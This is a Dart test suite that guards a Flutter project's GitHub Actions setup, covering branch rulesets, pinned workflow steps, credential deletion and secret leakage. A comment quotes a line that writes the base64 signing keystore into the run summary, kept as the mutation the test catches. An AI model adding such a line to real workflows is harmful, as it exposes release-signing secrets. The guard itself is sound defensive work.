      // not have. That was simply untrue: this repository is public, and
      // the rulesets endpoint answers 200 to an anonymous request with the
      // enforcement state, the branch condition and both required checks.
      // Only `bypass_actors` is redacted. So the check runs everywhere,
      // including CI, and the reason it did not was that `ci.yml` passes no
      // token at all (#202).
      const rulesetUrl =
          'https://api.github.com/repos/honestarcade/HonestSudoku/rulesets/23682733';
      // Authenticated WHEN A TOKEN IS AVAILABLE, anonymous otherwise.
      //
      // The anonymous limit is 60 requests per hour per IP, and the battery
      // runs this suite once per mutation — 88 calls from one address. That
      // was filed as a latent risk and then happened, locally, inside this
      // session: `ruleset: unexpected HTTP 403`. A token raises the limit to
      // 5000/hr, and `github.token` is available to every CI job (#219).
      //
      // The anonymous path stays as the fallback, because it is what makes
      // this guard work for a contributor with no token at all.
      final token =
          Platform.environment['GITHUB_TOKEN'] ??
          Platform.environment['GH_TOKEN'] ??
          '';
      late final ProcessResult probe;
      try {
        probe = Process.runSync(
          'curl',
          [
            '-sS',
            '--max-time',
            '20',
            '-w',
            '\n%{http_code}',
            '-H',
            'Accept: application/vnd.github+json',
            if (token.isNotEmpty) ...['-H', 'Authorization: Bearer $token'],
            rulesetUrl,
          ],
          stdoutEncoding: utf8,
          stderrEncoding: utf8,
        );
      } on ProcessException {
        // `Process.runSync` THROWS when the binary is absent; it does not
        // return a non-zero code. The old skip branch could therefore only
        // ever mean "unauthenticated", and a developer without the tool got
        // the red suite its comment promised they would not (#202).
        markTestSkipped('curl is not installed');
        return;
      }

      final lines = probe.stdout.toString().trim().split('\n');
      final status = lines.isEmpty ? '' : lines.last.trim();
      final payload = lines.take(lines.length - 1).join('\n');

      if (probe.exitCode != 0) {
        markTestSkipped('no network: ${probe.stderr}');
        return;
      }
      if (_isRateLimited(status, payload)) {
        // Rate limiting says nothing about the ruleset, so it must not be
        // reported as though the gate were unguarded. Skipping is honest;
        // failing here would be the same false red the ProcessException
        // branch was written to avoid (#219).
        markTestSkipped(
          'GitHub rate-limited this read. Set GITHUB_TOKEN to raise the '
          'limit from 60/hr to 5000/hr.',
        );
        return;
      }
      if (status == '404') {
        // Pointing this test at a nonexistent id printed `All tests
        // passed!`, so DELETING the ruleset — the single most likely way to
        // undo #187 — was invisible to the guard built to detect it (#202).
        fail(
          'ruleset: the ruleset at $rulesetUrl does not exist. The `main` '
          'branch has no protection, so nothing requires `gate` or '
          '`mutations` before a merge',
        );
      }
      expect(
        status,
        '200',
        reason: 'ruleset: unexpected HTTP $status reading the ruleset',
      );

      final doc = jsonDecode(payload) as Map<String, dynamic>;

      // WHOLE TOKENS, not substrings. `contains('active')` is satisfied by
      // the substring inside `inactive`, so a ruleset switched to
      // `enforcement: disabled` passed; and `contains('gate:15368')` is
      // satisfied by `CI / gate:15368`, which is the PR UI's rendering and
      // exactly the #137 failure this test's own message warns about. Both
      // were green at round eight (#202).
      expect(
        doc['enforcement'],
        'active',
        reason:
            'ruleset: the main branch ruleset is `${doc['enforcement']}`, '
            'not active — nothing it says is enforced',
      );

      // `target` decides what `~DEFAULT_BRANCH` even means. Flipped to `tag`,
      // every other assertion here still passes while `main` is completely
      // unguarded — which is a gate that exists and does not bind, the exact
      // shape of #187 (#219).
      expect(
        doc['target'],
        'branch',
        reason:
            'ruleset: the ruleset targets `${doc['target']}`, not branches, '
            'so its branch condition guards nothing',
      );

      final ruleTypes = [
        for (final rule in (doc['rules'] as List? ?? const []))
          (rule as Map)['type'],
      ];
      expect(
        ruleTypes,
        contains('pull_request'),
        reason:
            'ruleset: no `pull_request` rule, so a push straight to `main` '
            'never meets a check at all. Required checks apply to pull '
            'requests; without this rule they are unreachable',
      );

      final refs =
          ((doc['conditions'] as Map<String, dynamic>?)?['ref_name']
                  as Map<String, dynamic>?)?['include']
              as List? ??
          const <String>[];
      expect(
        refs.cast<String>(),
        contains('~DEFAULT_BRANCH'),
        reason:
            'ruleset: the ruleset does not apply to the default branch, so '
            'it can be active and still not guard `main`',
      );

      final required = <String>[
        for (final rule in (doc['rules'] as List? ?? const []))
          if ((rule as Map)['type'] == 'required_status_checks')
            for (final check
                in ((rule['parameters'] as Map)['required_status_checks']
                    as List))
              '${(check as Map)['context']}:${check['integration_id']}',
      ];
      for (final check in const ['gate', 'mutations']) {
        expect(
          required,
          contains('$check:15368'),
          reason:
              'ruleset: `$check` is not a required status check pinned to '
              'GitHub Actions. Required now: $required. The context is the '
              "CHECK-RUN NAME, not the PR UI's rendering (`CI / $check`) — "
              '#137 learned that twice',
        );
      }

      // `bypass_actors` is redacted unless the caller is authenticated with
      // enough scope to see it: the key is ABSENT from an anonymous read, not
      // null-valued. Before the token was sent this branch could therefore
      // never execute, while the comment above it claimed it ran "where a
      // token is present" — a path that did not exist (#219).
      //
      // Now a token is sent when one is available, and with it the field
      // comes back (`[]` on this repository). Where no token is available the
      // branch still does not run, which is why the absence is reported
      // rather than passed over in silence.
      final bypass = doc['bypass_actors'];
      if (bypass == null) {
        printOnFailure(
          'ruleset: bypass_actors was not returned, so nobody checked whether '
          'an actor can push past the gate. Set GITHUB_TOKEN to a token that '
          'can read repository administration to cover it.',
        );
      }
      if (bypass != null) {
        expect(
          bypass,
          isEmpty,
          reason:
              'ruleset: $bypass can push to `main` without the checks. A '
              'bypass actor is the gate not applying to whoever matters '
              'most',
        );
      }
    });

    test('every declared key link is actually wired', () {
      // The scripts with the most thorough tests here are worth nothing if
      // no workflow invokes them — and nothing checked that. `release.yml`
      // could stop calling `ci_version.sh`, and `play-promote.yml` stop
      // calling `play_promote.sh`, with the suite green (#206). Both are
      // declared `key_links` in their stories' Must-haves.
      //
      // What this test does NOT do, said plainly because the comment that
      // stood here said the opposite. It read "Equality, not `contains`:
      // `contains` survives `|| true` and a renamed flag" while the code
      // below was `contains`, so `|| true` on `play_promote.sh` was green,
      // as were a commented-out call, an unreachable branch and a rename to
      // a file that does not exist (#206, #211).
      //
      // Text cannot decide whether a step still DEPENDS on a script; only
      // running it can, and `a step fails when the command it runs fails`
      // does exactly that for every workflow. So this test now asserts the
      // declaration is covered THERE, and the wiring is proven by execution
      // rather than by a substring. The value it keeps is naming the link a
      // story promised, which an exit code cannot do.
      const links = <String, (String, String)>{
        'release.yml → ci_version.sh': (
          '.github/workflows/release.yml',
          'tools/ci_version.sh',
        ),
        'release.yml → check_aab.sh': (
          '.github/workflows/release.yml',
          'tools/check_aab.sh',
        ),
        'release.yml → verify_upload_cert.sh': (
          '.github/workflows/release.yml',
          'tools/verify_upload_cert.sh',
        ),
        'play-promote.yml → play_promote.sh': (
          '.github/workflows/play-promote.yml',
          'tools/play_promote.sh',
        ),
        'ci.yml → gate.sh': ('.github/workflows/ci.yml', 'tools/gate.sh'),
        'ci.yml → mutation_check.py': (
          '.github/workflows/ci.yml',
          'tools/mutation_check.py',
        ),
      };
      links.forEach((name, link) {
        final (workflow, script) = link;
        expect(
          pathExists(script),
          isTrue,
          reason: 'key-link: $script does not exist',
        );
        expect(
          _propagationCommands(workflow),
          contains(script),
          reason:
              'key-link: $name is declared in the story\'s Must-haves, but '
              'no step of $workflow is exercised against $script in `a step '
              'fails when the command it runs fails`. Until it is, nothing '
              'proves the workflow still depends on it — every refusal that '
              'script makes is dead code if nothing calls it',
        );
      });
    });

    test('every workflow pins its step set', () {
      // `ship`'s 18 ids were pinned for #182; `play-promote.yml` was not, so
      // a NEW step there could publish #130's literal string on every
      // failure path with the suite green (#209).
      //
      // The first version of this test said it was "derived from the files
      // rather than named per-file" and was a two-entry literal covering two
      // of the four workflows. That comment was false, and what it hid was
      // `release.yml`'s `report-gate-failure`: a job whose NAME was pinned,
      // whose steps were pinned nowhere, which runs on every failed gate and
      // can read every workflow-level secret. A step there that base64'd the
      // signing keystore into the run summary passed the whole suite.
      //
      // So the enumeration is now closed against the directory: every file
      // `_workflowFiles()` finds, and every job in it, must appear below.
      // A new workflow, or a new job in an existing one, fails this test
      // until someone writes down what its steps are. That is the property
      // the old comment claimed and the old code did not have.
      const expected = <String, Map<String, List<String>>>{
        '.github/workflows/play-promote.yml': {
          'promote': [
            'refuse',
            'checkout',
            'token',
            'promote',
            'summary',
            'forget',
          ],
        },
        '.github/workflows/play-api-check.yml': {
          'check': ['checkout', 'java', 'play', 'keystore', 'forget'],
        },
        '.github/workflows/release.yml': {
          'gate': <String>[],
          'ship': [
            'checkout',
            'secrets_present',
            'version',
            'java',
            'flutter',
            'deps',
            'keystore',
            'keystore_check',
            'build',
            'scan',
            'cert',
            'sidecar',
            'artifact',
            'asset',
            'play',
            'summary',
            'name_failure',
            'shred',
          ],
          'report-gate-failure': ['say'],
        },
        '.github/workflows/ci.yml': {
          'gate': [
            'checkout',
            'shellcheck',
            'java',
            'flutter',
            'deps',
            'guards',
            'gate',
            'artifact',
          ],
          'mutations': ['checkout', 'java', 'flutter', 'deps', 'mutations'],
        },
      };

      expect(
        expected.keys.toSet(),
        _workflowFiles().toSet(),
        reason:
            'step-set: a workflow file is not pinned here. Every file in '
            '$_workflowDir must have its jobs and steps written down — an '
            'unpinned file is a place a step can be added silently, which '
            'is #209',
      );

      expected.forEach((path, jobs) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        expect(
          wf.jobs.map((j) => j.name).toList(),
          jobs.keys.toList(),
          reason: 'step-set: $path has jobs other than ${jobs.keys}',
        );
        jobs.forEach((job, ids) {
          expect(
            wf.job(job)!.steps.map((s) => s.id).toList(),
            ids,
            reason:
                'step-set: exactly these steps in this order in '
                '$path job `$job` — an inserted step runs with whatever '
                'that job holds, which here is ${_jobHolds(path, job)}',
          );
        });
      });
    });

    test('every step that promises to destroy a credential destroys it', () {
      // #216. Nine steps were declared `[]` in `_dependsOn` — "this step's
      // failure does not matter" — and a `[]` step is never run at all, so
      // seven of them were exercised by nothing. Three of those exist solely
      // to destroy a credential, and each could be replaced by `echo` with
      // the whole suite green:
      //
      //   release.yml      ship    shred   -> the decoded signing keystore
      //   play-promote.yml promote forget  -> the service-account key
      //   play-api-check   check   forget  -> the key AND the keystore
      //
      // Declaring a step exempt from the propagation check is reasonable —
      // its failure genuinely should not stop the job. What was missing is
      // the other half: saying what DOES cover it. This is that half, and it
      // asks the only question that matters for a step named "remove": run
      // it, then look for the file.
      const destroys =
          <String, ({String job, String step, List<String> files})>{
            '.github/workflows/release.yml': (
              job: 'ship',
              step: 'shred',
              files: ['upload.keystore'],
            ),
            '.github/workflows/play-promote.yml': (
              job: 'promote',
              step: 'forget',
              files: ['play-sa.json'],
            ),
            '.github/workflows/play-api-check.yml': (
              job: 'check',
              step: 'forget',
              files: ['play-sa.json', 'upload.keystore'],
            ),
          };

      destroys.forEach((path, spec) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        final step = wf
            .job(spec.job)!
            .steps
            .firstWhere(
              (s) => s.id == spec.step,
              orElse: () => fail(
                'destroys: $path job `${spec.job}` has no step `${spec.step}` — '
                'the step that removes ${spec.files.join(' and ')} is gone',
              ),
            );

        final r = _runStepBody(
          step.run!,
          ambient: _ambientCommands,
          keepWorkspace: true,
        );
        try {
          for (final name in spec.files) {
            final left = File('${r.workspace.path}/runner/$name');
            expect(
              left.existsSync(),
              isFalse,
              reason:
                  'destroys: $path job `${spec.job}` step `${spec.step}` ran '
                  'and `$name` is still in \$RUNNER_TEMP. The credential '
                  'survives the job — on a hosted runner that is the end of '
                  'it, but the step promises otherwise and nothing else '
                  'checks',
            );
          }
        } finally {
          r.workspace.deleteSync(recursive: true);
        }
      });
    });

    test('no step publishes a secret it was handed', () {
      // #215. Pinning a step set fixes WHICH steps exist; it says nothing
      // about what they do. At 933cfad a single line appended to the
      // already-pinned `keystore` step —
      //
      //     echo "$HS_KEYSTORE_B64" >> "$GITHUB_STEP_SUMMARY"
      //
      // put the base64 of the release signing keystore into a rendered,
      // retained, downloadable run summary, and the whole suite was green.
      // Three guards each declined for a different reason: the step set was
      // unchanged; the textual secret rule only refuses `${{ secrets.* }}`
      // INSIDE a `run:` body, and this secret arrives through `env:`; and
      // the propagation harness reads exit codes, never output.
      //
      // So the question is asked of bash, the way #205 asks every other
      // runtime question: bind each secret the step declares to a value
      // nothing else could produce, run the body, and look at everything it
      // wrote.
      //
      // Scope, stated because the name is broader than the rule: this covers
      // a secret the step is HANDED, through workflow-, job- or step-level
      // `env:`. A step with no `env:` cannot leak one this way — `forget` in
      // play-promote.yml is the example, and a body of `echo
      // "$PLAY_SERVICE_ACCOUNT_JSON"` there expands to nothing. What it does
      // NOT cover is a step reading a secret back off DISK that an earlier
      // step wrote, such as `$RUNNER_TEMP/play-sa.json`. `forget` removing
      // that file is asserted separately (#216); a step publishing its
      // contents is not covered here.
      for (final path in _workflowFiles()) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        for (final job in wf.jobs) {
          for (final step in job.steps) {
            final body = step.run;
            if (body == null) continue;

            // The secrets THIS step is given, workflow- and job-level env
            // included — a value in scope is a value the body can echo.
            final secretEnv = <String, String>{};
            var n = 0;
            for (final env in [wf.env, job.env, step.env]) {
              env.forEach((name, value) {
                if (!RegExp(r'\$\{\{\s*secrets\.').hasMatch(value)) return;
                // The keystore ALIAS is stored as a secret and is public by
                // design: it is in `android/signing/README.md`, on keytool's
                // command line, and the play-api-check summary reports it on
                // purpose. `secrets_scripts_test.dart` already excludes it
                // from sentinel derivation for the same reason; the two must
                // agree or one of them is wrong.
                if (name.toUpperCase().endsWith('ALIAS')) return;
                secretEnv[name] = 'HS-SENTINEL-${n++}-do-not-publish';
              });
            }
            if (secretEnv.isEmpty) continue;

            final r = _runStepBody(
              body,
              ambient: _ambientCommands,
              extraEnv: secretEnv,
            );

            for (final entry in secretEnv.entries) {
              for (final channel in <(String, String)>[
                ('stdout', r.out),
                ('stderr', r.err),
                ('a file it wrote (the run summary is one)', r.wrote),
              ]) {
                expect(
                  channel.$2,
                  isNot(contains(entry.value)),
                  reason:
                      'published-secret: $path job `${job.name}` step '
                      '`${step.id}` writes the value of `${entry.key}` to '
                      '${channel.$1}. A step set pins which steps exist, not '
                      r'what they do — and `$GITHUB_STEP_SUMMARY` is '
                      'rendered, '
                      'retained and downloadable by anyone with read access',
                );
              }
            }
          }
        }
      }
    });

    test('a step fails when the command it runs fails', () {
      // #205's principle, applied to every workflow rather than one job.
      //
      // `_swallowsFailure` was a per-line regex asked to answer a
      // shell-semantics question, and it lost to a `#` inside a quoted
      // string, a trailing `&`, `|| echo`, `$( || true )`, `set +o errexit`,
      // and any command outside an eight-item allow-list (#197, #204). Every
      // one of those is ORDINARY SHELL, and bash decides shell questions
      // correctly by construction.
      //
      // Round eight then found the fix had the SAME blast radius as the
      // thing it replaced: it looped `release.yml`'s `ship` job alone, so 9
      // of the repository's 27 run-bodied steps were exercised and `|| true`
      // on `tools/play_promote.sh` — the one key link nothing else covers —
      // was green (#204, #206). A second mechanism with the same scope is
      // not a fix, so the loop is now over every workflow file.
      //
      // This also subsumes the key-link question. A `key-link` test that
      // asks whether a step's text CONTAINS a script name says yes to a
      // commented-out call, an unreachable branch, a renamed file and
      // `|| true`. Running the step with that script failing answers the
      // question that was actually being asked: does this step still depend
      // on that script.

      // The map is closed against the files: every run-bodied step in every
      // workflow must be named. A step whose failure genuinely does not
      // matter is named with an empty list, so leaving one out is a
      // deliberate act rather than an omission nobody sees.
      final actual = <String>{};
      for (final path in _workflowFiles()) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        for (final job in wf.jobs) {
          for (final step in job.steps) {
            if (step.run != null) actual.add('$path ${job.name} ${step.id}');
          }
        }
      }
      final declared = <String>{
        for (final path in _dependsOn.keys)
          for (final job in _dependsOn[path]!.keys)
            for (final id in _dependsOn[path]![job]!.keys) '$path $job $id',
      };
      expect(
        declared,
        actual,
        reason:
            'propagation: a step with a `run:` body is not listed in '
            'dependsOn. Say which command it depends on, or say none',
      );

      final ambient = _ambientCommands;

      _dependsOn.forEach((path, jobs) {
        final wf = Workflow.parse(path, readFile(path));
        jobs.forEach((job, steps) {
          steps.forEach((id, commands) {
            final step = wf.job(job)!.steps.firstWhere((s) => s.id == id);
            final body = step.run!;
            for (final command in commands) {
              // BOTH directions, and the second is the one #204 was missing.
              //
              // Asking only "does it fail when the command fails" is
              // satisfied by a body that fails NO MATTER WHAT, and four of
              // the nine steps then covered did exactly that: `build`
              // because `${{ … }}` is a bash bad substitution that aborts
              // before `flutter` is reached, `sidecar` and `keystore`
              // because the harness lacked files they open, and `asset`
              // because `sha256sum` is absent on macOS. `isNot(0)` held
              // unconditionally, so the assertion proved nothing about them.
              //
              // A test that cannot pass is as useless as one that cannot
              // fail, so the same body is also run with everything
              // succeeding and must then SUCCEED.
              final failed = _runStepBody(
                body,
                ambient: ambient,
                failing: command,
              );
              expect(
                failed.code,
                isNot(0),
                reason:
                    'propagation: $path job `$job` step `$id` reported '
                    'SUCCESS while `$command` exited 1. Its failure does not '
                    'reach the step, so the step guarantees nothing — and if '
                    '`$command` is a project script, nothing now proves the '
                    'step still runs it. stdout: ${failed.out}',
              );

              final clean = _runStepBody(body, ambient: ambient);
              expect(
                clean.code,
                0,
                reason:
                    'vacuity: $path job `$job` step `$id` fails even when '
                    '`$command` SUCCEEDS, so the propagation check above it '
                    'is satisfied unconditionally and proves nothing. Fix '
                    'the harness until this step can pass, or the assertion '
                    'is theatre. stderr: ${clean.err}',
              );
            }
          });
        });
      });
    });

    test('every rule reports a document it cannot read, and never throws', () {
      // #203, answered by running the rules instead of reading them.
      //
      // The chain is five long: #177 the error handling was missing; #191 no
      // test reached it; #194 the test reached it through a bypassable seam;
      // #203 the call sites could route around it; and at round eight the
      // text assertion written for #203 was itself defeated three ways —
      // repoint five of six call sites and leave one `Workflow.parse(` and
      // the set equality is satisfied; put the required spelling in a
      // COMMENT and no real call site is needed at all; or reach a second
      // parse path through an extension, a helper in a third file, or a
      // tear-off, none of which spell `Workflow.`.
      //
      // Every one of those defeats a rule ABOUT the source, and none of them
      // survives running the rules: the property is a runtime one. Whatever
      // a rule calls internally, a document it cannot read must come back as
      // an offender rather than as an exception that takes the suite with it.
      //
      // Honest limit, because this is the fifth attempt at this property and
      // an overstated claim is what made the previous four look finished:
      // this covers the errors a loader RETURNS on bad input. It does not
      // reproduce a stack overflow — the depth needed to overflow the
      // recursive loader also destabilises whatever test file runs beside it
      // (#177, #191), so `Workflow.parse` keeps its own injected-loader test
      // for that one. What changed is that the OTHER paths are no longer
      // unguarded.
      const rules = <String, List<WorkflowOffender> Function(String, String)>{
        'unpinnedUses': unpinnedUses,
        'permissionOffenders': permissionOffenders,
        'concurrencyOffenders': concurrencyOffenders,
        'secretsInRunOffenders': secretsInRunOffenders,
        'untrustedInRunOffenders': untrustedInRunOffenders,
        'shellTraceOffenders': shellTraceOffenders,
      };

      // NO OVERFLOW ROW HERE, and #217 carries why.
      //
      // The document that would close #217 must raise an `Error`, not an
      // `Exception` — that distinction is the whole five-issue lineage, and
      // only a stack overflow in the loader produces one. Measured: alias
      // recursion and billion-laughs both raise `YamlException`, which the
      // bypass catches, and pre-consuming the stack by 120000 frames does not
      // overflow either.
      //
      // A real overflow is machine-dependent and expensive. On this macOS
      // machine 32000 levels overflow; on the ubuntu runner they parse
      // cleanly as a YamlList, so the row silently exercised ordinary control
      // flow there — caught only because the row asserted it had overflowed.
      // Cost climbs superlinearly per rule: 32000 -> 5s, 64000 -> 20s,
      // 96000 -> 45s, and the runner needs more than 32000.
      //
      // So a fixed depth is wrong on one machine or the other, an adaptive
      // search costs minutes on the deeper-stacked one, and skipping where it
      // cannot overflow would make the #217 mutation survive in CI. None of
      // those ships. The data and the likeliest real fix — run the parse in a
      // subprocess under `ulimit -s`, which makes the depth small and the
      // machine irrelevant — are on the issue.

      const unreadable = <String, String>{
        'unclosed flow sequence': 'jobs: [a, b',
        'a tab where YAML forbids one': 'jobs:\n\tbuild: {}',
        'duplicate mapping key': 'on: push\non: pull_request\n',
        'not a mapping at all': '- just\n- a\n- list\n',
        'a bare scalar': 'nonsense',
        'an alias to nothing': 'jobs: *missing\n',
      };
      // Two of these — `not a mapping at all` and `a bare scalar` — are VALID
      // YAML. They exercise the `doc is! YamlMap` branch, which is ordinary
      // control flow, not error handling. Said plainly because the test's name
      // covers them and its purpose does not (#217).

      for (final rule in rules.entries) {
        unreadable.forEach((what, text) {
          late final List<WorkflowOffender> offenders;
          expect(
            () => offenders = rule.value('.github/workflows/bad.yml', text),
            returnsNormally,
            reason:
                'parse-path: rule `${rule.key}` THREW on $what instead of '
                'reporting it. A workflow nobody can parse is a workflow '
                'nobody is checking, and the exception takes the whole suite '
                'with it — #177, reachable again through whatever parse path '
                'this rule uses',
          );
          expect(
            offenders,
            isNotEmpty,
            reason:
                'parse-path: rule `${rule.key}` returned NO offender for $what. '
                'Silence and "this file is fine" are the same answer to the '
                'caller, which is how an unparseable workflow passes a gate',
          );
        });
      }
    });

    test('the rules parse through Workflow.parse and nothing else', () {
      // #203: `parse` and `parseWithLoader` were collapsed into one body so
      // there would be "no second body to rewrite". A NEW one can still be
      // added and the rules repointed at it — I did exactly that and the
      // suite stayed green with `dart analyze` clean.
      //
      // The chain: #177 the handler was missing; #191 no test reached it;
      // #194 the test reached it through a bypassable seam; #203 the call
      // sites route around it. The link that has never been asserted is
      // WHICH FUNCTION THE RULES CALL, so that is what this asserts.
      final rules = readFile('test/guards/workflow_rules.dart');
      expect(
        rules,
        isNot(contains('loadYaml')),
        reason:
            'parse-path: workflow_rules.dart loads YAML itself, bypassing '
            'the error handling in Workflow.parse',
      );
      final entryPoints = RegExp(r'Workflow\.(\w+)\(')
          .allMatches(rules)
          .map((m) => m.group(1))
          .toSet();
      expect(
        entryPoints,
        {'parse'},
        reason:
            'parse-path: the rules reach Workflow through $entryPoints. '
            'Only `parse` carries the StackOverflowError handling, so any '
            'other entry point is #177 back on the production path',
      );
      // And nothing may pass a loader: the default is the real one.
      // Anchored: a bare `load:` also matches the word `payload:` in a
      // comment, which is how this test first failed on its own prose.
      expect(
        RegExp(r'[\s(,]load:\s').hasMatch(rules),
        isFalse,
        reason:
            'parse-path: a rule passes its own loader, so the handler it '
            'relies on is whatever that loader does',
      );
    });

    test('dependabot watches both ecosystems', () {
      final offenders = dependabotOffenders(
        pathExists('.github/dependabot.yml')
            ? readFile('.github/dependabot.yml')
            : null,
      );
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('dependabot', offenders),
      );
    });
    test('the .fvmrc pin satisfies the pubspec range', () {
      final offenders = flutterPinOffenders(
        readFile('.fvmrc'),
        readFile('pubspec.yaml'),
      );
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('flutter-pin', offenders),
      );
    });
  });
}
